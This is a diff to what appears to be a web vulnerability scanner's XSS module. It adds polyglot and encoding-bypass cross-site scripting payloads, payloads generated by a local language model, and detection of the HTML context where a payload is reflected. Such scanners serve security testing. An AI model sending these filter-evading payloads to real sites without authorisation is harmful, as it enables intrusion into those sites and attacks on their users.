@@ -56,6 +56,12 @@ class XSSModule:
         
         # Test polyglot payloads
         self._test_polyglot(url, method, param, value)
+        
+        # Test encoding bypass
+        self._test_encoding_bypass(url, method, param, value)
+
+        # LLM-generated adaptive XSS payloads
+        self._test_llm_payloads(url, method, param, value)
     
     def _test_mxss(self, url: str, method: str, param: str, value: str):
         """Test for mutation XSS (mXSS)"""
@@ -134,6 +140,10 @@ class XSSModule:
             "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
             "'-alert()-'",
             '</script><svg onload=alert()>',
+            '\'"><svg/onload=alert(1)//',
+            '<img src=x onerror=alert(1)//>',
+            '<video><source onerror=alert(1)>',
+            '<body onpageshow=alert(1)>',
         ]
         for payload in payloads:
             try:
@@ -147,6 +157,68 @@ class XSSModule:
                         technique="XSS (Polyglot)", url=url,
                         severity='HIGH', confidence=0.8, param=param,
                         payload=payload, evidence="Polyglot XSS payload reflected",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_encoding_bypass(self, url: str, method: str, param: str, value: str):
+        """Test for XSS with encoding bypass payloads"""
+        payloads = [
+            '<svg/onload=alert(1)>',  # No quotes, no spaces
+            '<img src=x onerror=alert`1`>',  # Template literal
+            '<svg onload=alert&lpar;1&rpar;>',  # HTML entity parentheses
+            '\\u003csvg onload=alert(1)\\u003e',  # Unicode escape
+            '<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>',  # HTML entity function name
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XSS (Encoding Bypass)", url=url,
+                        severity='HIGH', confidence=0.85, param=param,
+                        payload=payload, evidence="Encoding bypass payload reflected unmodified",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
+        """Test with LLM-generated adaptive XSS payloads.
+
+        Uses Qwen2.5-7B to produce context-aware payloads when the local
+        LLM is loaded (``--local-llm``).  Gracefully skips otherwise.
+        """
+        ai = getattr(self.engine, 'ai', None)
+        if ai is None:
+            return
+        llm_payloads = ai.get_llm_payloads('xss', param)
+        if not llm_payloads:
+            return
+
+        for payload in llm_payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XSS (AI-generated Reflected)",
+                        url=url,
+                        severity='HIGH',
+                        confidence=0.80,
+                        param=param,
+                        payload=payload,
+                        evidence="AI payload reflected unescaped in response",
                     )
                     self.engine.add_finding(finding)
                     return
@@ -180,6 +252,17 @@ class XSSModule:
                 
                 # Check if payload is reflected
                 if payload in response_text:
+                    # Detect HTML context of the reflection
+                    context_info = ""
+                    context_confidence = None
+                    escaped_payload = re.escape(payload)
+                    if re.search(r'<script[^>]*>.*?' + escaped_payload, response_text, re.DOTALL | re.IGNORECASE):
+                        context_info = " (reflected inside <script> tag context)"
+                        context_confidence = 0.95
+                    elif re.search(r'=[\'"]' + escaped_payload, response_text):
+                        context_info = " (reflected inside HTML attribute context)"
+                        context_confidence = 0.85
+
                     # Check if it's properly sanitized
                     sanitized = self._is_sanitized(payload, response_text)
                     
@@ -189,20 +272,20 @@ class XSSModule:
                             technique="XSS (Reflected)",
                             url=url,
                             severity='HIGH',
-                            confidence=0.9,
+                            confidence=context_confidence if context_confidence else 0.9,
                             param=param,
                             payload=payload,
-                            evidence="Payload reflected without sanitization",
+                            evidence="Payload reflected without sanitization" + context_info,
                         )
                     else:
                         finding = Finding(
                             technique="XSS (Potentially Filtered)",
                             url=url,
                             severity='MEDIUM',
-                            confidence=0.6,
+                            confidence=context_confidence if context_confidence else 0.6,
                             param=param,
                             payload=payload,
-                            evidence="Payload reflected but may be sanitized",
+                            evidence="Payload reflected but may be sanitized" + context_info,
                         )
                     
                     self.engine.add_finding(finding)
